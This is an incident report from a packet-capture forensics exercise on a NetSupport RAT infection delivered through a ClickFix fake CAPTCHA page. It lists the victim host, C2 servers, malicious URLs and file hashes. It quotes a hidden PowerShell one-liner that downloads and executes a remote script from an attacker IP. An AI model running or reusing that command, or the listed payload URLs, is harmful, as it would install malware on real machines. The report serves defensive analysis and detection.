# Incident Report — PCAP Forensic Analysis
**Evidence:** `2025-01-22-traffic-analysis-exercise.pcap` (39,427 frames, single host of interest)
**Analyst tool:** tshark (no other artifacts present in the evidence folder — no IDS/Suricata export was provided)

## Victim host

| Field | Value |
|---|---|
| IPv4 | 10.1.17.215 |
| MAC | 00:d0:b7:26:4a:74 |
| Windows hostname | DESKTOP-L8C5GSJ |
| AD domain | bluemoontuesday.com (BLUEMOONTUESDAY) |
| Logged-in user | shutchenson (confirmed via Kerberos AS-REQ CNameString, realm BLUEMOONTUESDAY.COM) |

Identified from the host's own DHCP request (option 12 hostname = DESKTOP-L8C5GSJ, requested IP 10.1.17.215) and corroborated by NBNS name registrations and Kerberos traffic from 10.1.17.215.

## Malware family

**NetSupport RAT** (NetSupport Manager remote-control software abused as a RAT), delivered via a **ClickFix-style fake CAPTCHA/"Google Authenticator" verification page**.

**Attribution basis: signature-confirmed.** The traffic to 185.188.32.26 contains the literal NetSupport Manager gateway protocol: HTTP GET requests to `/din.aspx` and `/dout.aspx` with `client=DynGate`, base64/XOR-style `data=` payloads, and the fixed User-Agent string `Mozilla/4.0 (compatible; MSIE 6.0; DynGate)`. These strings (`din.aspx`, `dout.aspx`, `DynGate`) are unique, hard-coded identifiers of the NetSupport Manager gateway client (client32.exe) network protocol, not something a generic script would emit — this is a protocol-level signature, not a behavioral inference. The Host header on this traffic is spoofed to `master16.teamviewer.com` while the payload files were downloaded under names `TeamViewer`, `TV`, and `Teamviewer_Resource_fr` (confirmed via `file`: `TeamViewer` is a 4.3 MB Windows GUI PE32, `TV` is a stripped PE32 console DLL, `Teamviewer_Resource_fr` is a 669 KB PE32 GUI DLL) — a disguise/renaming of the real NetSupport client binaries.

The initial-access chain (behavioral, corroborating): the host visited `google-authenticator.burleson-appliance.net` (t=38s) then `authenticatoor.org` (t=39s, 2.3 MB TLS session — the fake CAPTCHA page) then `appointedtimeagriculture.com` (t=52s), followed at t=60s by a plaintext HTTP GET to `5.252.153.241/api/file/get-file/264872`. That file is an HTA `<component>` with embedded VBScript that launches:
```
cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command "start-process 'https://azure.microsoft.com'; iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')"
```
This is the classic "ClickFix" pattern (fake verification page tricks the user into pasting/running a command that invokes `mshta`/PowerShell). The downloaded `29842.ps1` and later `pas.ps1` are obfuscated PowerShell (Base64 wrapped in a `FromBase64String`/`GetString` construct with junk characters `#`, `;`, `[` stripped at runtime) — this is the loader stage that installs the NetSupport RAT binaries and establishes persistence (a beacon back to the loader panel reported `message = startup shortcut created; status = success`).

## Indicators of Compromise

**C2 endpoints (IP:port)**
- 5.252.153.241:80 — loader/check-in panel (sustained beaconing every ~5.2 seconds to `GET /1517096937` for over 40 minutes, with status callbacks such as `?k=script: RunRH, status: OK, message: PS process started` and `?k=message = startup shortcut created; status = success;`)
- 185.188.32.26:80 — NetSupport RAT DynGate gateway, Host header spoofed as `master16.teamviewer.com`

**Malicious / phishing domains (DNS-resolved from the victim)**
- google-authenticator.burleson-appliance.net → 104.21.x.1 (Cloudflare-fronted)
- authenticatoor.org → 82.221.136.26 (fake CAPTCHA/ClickFix landing page)
- appointedtimeagriculture.com → 217.70.186.109
- master16.teamviewer.com → 185.188.32.26 (spoofed/hijacked resolution used for the NetSupport gateway; not a legitimate TeamViewer IP)
- ping3.dyngate.com (queried; no A record captured in this trace)

**Malicious URLs**
- `http://5.252.153.241/api/file/get-file/264872` — HTA/VBScript dropper
- `http://5.252.153.241/api/file/get-file/29842.ps1` — obfuscated PowerShell stage 1
- `http://5.252.153.241/api/file/get-file/pas.ps1` — obfuscated PowerShell stage 2
- `http://5.252.153.241/api/file/get-file/TeamViewer` — NetSupport RAT main binary (disguised)
- `http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr` — NetSupport RAT resource DLL (disguised)
- `http://5.252.153.241/api/file/get-file/TV` — NetSupport RAT support DLL (disguised)
- `http://185.188.32.26/din.aspx?...client=DynGate...` and `http://185.188.32.26/dout.aspx?...client=DynGate...` — NetSupport RAT gateway check-in/exfil

**Transferred files and SHA256**

| File | Type | SHA256 |
|---|---|---|
| 264872 | HTA/VBScript dropper | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 |
| 29842.ps1 | Obfuscated PowerShell (stage 1) | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded |
| pas.ps1 | Obfuscated PowerShell (stage 2) | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e |
| TeamViewer | PE32 GUI (NetSupport client, renamed) | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e |
| Teamviewer_Resource_fr | PE32 GUI DLL (NetSupport resource, renamed) | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 |
| TV | PE32 console DLL (NetSupport component, renamed) | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 |

## Summary
The user `shutchenson` on `DESKTOP-L8C5GSJ` (10.1.17.215) was infected via a ClickFix-style fake CAPTCHA/Google-Authenticator page, which delivered an HTA/PowerShell loader from `5.252.153.241`. That loader installed **NetSupport RAT** (binaries renamed as TeamViewer components) and set up persistence via a startup shortcut. The malware maintains two channels: a check-in beacon to `5.252.153.241:80` and the NetSupport RAT's own gateway protocol to `185.188.32.26:80` (masquerading as `master16.teamviewer.com`).
